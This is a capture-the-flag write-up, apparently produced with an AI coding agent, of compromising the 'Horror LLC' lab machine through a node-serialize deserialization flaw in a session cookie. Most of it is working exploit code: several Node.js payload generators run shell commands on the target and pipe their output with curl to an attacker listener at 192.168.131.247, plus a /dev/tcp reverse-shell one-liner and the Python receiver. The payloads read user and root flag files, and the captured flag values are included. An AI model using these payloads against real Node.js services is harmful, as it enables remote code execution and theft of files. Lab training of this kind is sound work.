# Horror LLC CTF Writeup
(***solved using gemini-cli***)

This writeup details the steps taken to compromise the Horror LLC target system, obtain `user.txt`, and escalate privileges to retrieve `root.txt`.

## Initial Reconnaissance & Vulnerability Identification

1.  **Target Identification**: The target system was identified with the IP address `10.48.156.231`.
2.  **Service Enumeration**: Initial scans revealed an HTTP service running on port 80, hosting a Node.js application.
3.  **Cookie Analysis**: Interacting with the web application revealed a `session` cookie. Decoding this cookie (which appeared to be Base64 encoded) showed a JSON object: `{"username":"guest"}`. The presence of a trailing dot after the Base64 string suggested a potential `node-serialize` vulnerability, common in Node.js applications using session management.
4.  **Vulnerability Confirmation (Blind RCE)**:
    *   A test payload for `node-serialize` was crafted to execute a `sleep 5` command:
        ```javascript
        const serialize = require('node-serialize');
        const payloadObj = {
            username: `_$$ND_FUNC$$_function() {
                try {
                    require("child_process").execSync("sleep 5");
                } catch(e) {}
            }()`
        };
        const serialized = serialize.serialize(payloadObj);
        const base64 = Buffer.from(serialized).toString('base64');
        console.log(base64 + ".");
        ```
    *   This payload was encoded and sent as the `session` cookie to the target. The HTTP request experienced a noticeable delay, confirming a blind Remote Code Execution (RCE) vulnerability.

## Challenges with Reverse Shells

Initial attempts to establish an interactive reverse shell using various techniques (e.g., `netcat`, `bash -i >& /dev/tcp/LHOST/LPORT 0>&1`) were problematic:
*   Connections were often established but immediately hung or lacked interactivity.
*   Outbound connections on non-standard ports seemed to face filtering or firewall restrictions.

Due to these inconsistencies, a more robust and reliable method for data exfiltration was necessary.

## Manual Replication and Interactive Shell Simulation (Human Approach)

While the automated agent successfully navigated the challenges, a human operator would experience the same difficulties, particularly with establishing a stable reverse shell. This section details the troubleshooting and the workaround developed to achieve a pseudo-interactive shell.

### The Challenge of Interactive Shells

Despite confirmed RCE, direct reverse shell attempts using `bash` or `python` payloads (e.g., to `netcat -lvnp 6969`) consistently failed to yield an interactive session. Common issues included:
*   The `netcat` listener showing a connection, but no interactive prompt.
*   The shell hanging immediately after connection.
*   This pointed to a highly restrictive outbound firewall or an application-layer proxy actively blocking non-HTTP/S traffic, even on ports that allow HTTP connections.

### Pivoting to Pseudo-Interactive Shell via HTTP Exfiltration

Recognizing the limitations, the strategy shifted to leveraging the confirmed HTTP outbound capability for a "pseudo-interactive" shell. This involved:

1.  **A Custom HTTP Listener**: Instead of `netcat`, a Python-based HTTP server (`catch_http_9001.py`) was used. This script is designed to:
    *   Listen on a specified port (e.g., `9001`).
    *   Handle `POST` requests.
    *   Print the request path and the body (which would contain the command's output) to the console.
    *   Ensures `sys.stdout.flush()` is called to prevent output buffering issues when the script is terminated.

    *(The `python -m http.server` was initially attempted but proved unsuitable as it does not natively support `POST` requests, leading to `501 Unsupported method` errors.)*

2.  **Interactive Payload Generation Script (`run_interactive_payload.js`)**: A local Node.js script was developed to streamline the process of generating payloads for arbitrary commands. This script takes a command as a command-line argument, embeds it into the `node-serialize` RCE payload, and wraps it to pipe its `stdout` and `stderr` (using `2>&1`) to a `curl -X POST --data-binary @-` request directed at the attacker's `catch_http_9001.py` listener.

    **Example `run_interactive_payload.js` logic:**
    ```javascript
    // Simplified representation
    function generate_interactive_payload(command) {
        // ... (node-serialize boilerplate)
        // This part embeds the command:
        cp.execSync("${command} 2>&1 | curl -X POST --data-binary @- http://192.168.131.247:9001/cmd_output");
        // ...
    }
    ```

### Manual Execution Workflow for Human Operators

For each command desired on the target:

1.  **Ensure Listener is Active**: Start the `catch_http_9001.py` listener on your attacking machine (e.g., `python3 /home/kali/catch_http_9001.py &`). Ensure port `9001` is free by killing any conflicting processes (e.g., `sudo lsof -i :9001` then `kill -9 <PID>`).
2.  **Generate Command Payload**: On your attacking machine, use `run_interactive_payload.js` to create the serialized payload for the command you wish to execute.
    ```bash
    PAYLOAD=$(node /home/kali/run_interactive_payload.js "your_command_here")
    ```
3.  **Send Payload to Target**: Use `curl` to deliver the payload via the `session` cookie.
    ```bash
    curl -m 10 -s -X GET -H "Cookie: session=$PAYLOAD" http://10.48.156.231
    ```
4.  **Observe Output**: The output of `your_command_here` will appear in the console where `catch_http_9001.py` is running, under the `--- PATH: /cmd_output ---` section.

This iterative process allowed for effective system enumeration and flag retrieval despite the lack of a traditional interactive shell.

## Blind Command Exfiltration via HTTP POST

Given the blind RCE, the strategy pivoted to exfiltrating command output via HTTP POST requests to a controlled listener.

### Methodology

1.  **Local HTTP Server**: A simple Python HTTP server (`catch_http_9001.py`) was set up on the attacking machine (`192.168.131.247`) on port 9001 to receive POST requests. This server was configured to print the received path and data to its console.
    ```python
    import sys
    import http.server
    import socketserver

    class MyHandler(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            print(f"--- PATH: {self.path} ---")
            sys.stdout.flush() # Ensure immediate output
            print(post_data.decode('utf-8', 'ignore'))
            sys.stdout.flush() # Ensure immediate output
            self.send_response(200)
            self.end_headers()

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", 9001), MyHandler) as httpd:
        print("Serving at port 9001")
        httpd.serve_forever()
    ```
2.  **Payload Generation**: A Node.js script (`generate_exfil_9001.js`) was used to create serialized payloads. These payloads would execute shell commands using `child_process.execSync` and pipe their standard output directly to `curl -X POST --data-binary @-` to the local HTTP server.
    ```javascript
    const serialize = require('node-serialize');
    const payloadObj = {
        username: `_$$ND_FUNC$$_function() {
            try {
                const cp = require("child_process");
                // Example commands for initial enumeration
                cp.execSync("id | curl -X POST --data-binary @- http://192.168.131.247:9001/id");
                cp.execSync("ls -la /home | curl -X POST --data-binary @- http://192.168.131.247:9001/home");
                cp.execSync("find / -name user.txt 2>/dev/null | curl -X POST --data-binary @- http://192.168.131.247:9001/find");
            } catch(e) {}
        }()`
    };
    const serialized = serialize.serialize(payloadObj);
    const base64 = Buffer.from(serialized).toString('base64');
    console.log(base64 + ".");
    ```

### Process

1.  The Python HTTP server was started in the background on the attacking machine.
2.  The Node.js payload generator created a Base64-encoded serialized object containing the commands to be executed.
3.  This encoded payload was sent to the target as the `session` cookie in an HTTP GET request.
4.  The `node-serialize` vulnerability on the target deserialized the cookie, executing the embedded commands.
5.  The output of these commands was then POSTed back to the Python HTTP server, and captured.

## Retrieving `user.txt`

The initial exfiltration yielded critical information:

*   **`id` output**: `uid=1001(ubuntu) gid=1002(ubuntu) groups=1002(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(lxd),1001(netdev)`
    *   This showed the current user as `ubuntu` and confirmed membership in the `sudo` group.
*   **`ls -la /home` output**: Revealed home directories for `dylan` and `ubuntu`.
*   **`find / -name user.txt` output**: Identified the location of the user flag as `/home/dylan/user.txt`.

With the path to `user.txt` known, a new payload was generated to simply `cat` its content and exfiltrate it:

```javascript
// generate_user_flag_exfil.js
const serialize = require('node-serialize');
const payloadObj = {
    username: `_$$ND_FUNC$$_function() {
        try {
            const cp = require("child_process");
            cp.execSync("cat /home/dylan/user.txt | curl -X POST --data-binary @- http://192.168.131.247:9001/user_flag");
        } catch(e) {}
    }()`
};
const serialized = serialize.serialize(payloadObj);
const base64 = Buffer.from(serialized).toString('base64');
console.log(base64 + ".");
```

Sending this payload resulted in the capture of:
**User Flag**: `0ba48780dee9f5677a4461f588af217c`

## Retrieving `root.txt` (Privilege Escalation)

The `id` output indicated that the `ubuntu` user was part of the `sudo` group. This is a common privilege escalation vector. The next logical step was to use `sudo` to read `root.txt`.

A new payload was crafted to execute `sudo cat /root/root.txt` and exfiltrate its content:

```javascript
// generate_root_flag_exfil.js
const serialize = require('node-serialize');
const payloadObj = {
    username: `_$$ND_FUNC$$_function() {
        try {
            const cp = require("child_process");
            cp.execSync("sudo cat /root/root.txt | curl -X POST --data-binary @- http://192.168.131.247:9001/root_flag");
        } catch(e) {}
    }()`
};
const serialized = serialize.serialize(payloadObj);
const base64 = Buffer.from(serialized).toString('base64');
console.log(base64 + ".");
```

Sending this payload successfully retrieved the root flag:
**Root Flag**: `2cd5a9fd3a0024bfa98d01d69241760e`

## Conclusion

The target system was compromised by exploiting an insecure deserialization vulnerability in a Node.js application using `node-serialize`. This granted blind RCE, which was leveraged for data exfiltration via HTTP POST. Privilege escalation to root was achieved by using `sudo` to read the root flag, as the `ubuntu` user was in the `sudo` group.

---
**User Flag**: `0ba48780dee9f5677a4461f588af217c`
**Root Flag**: `2cd5a9fd3a0024bfa98d01d69241760e`
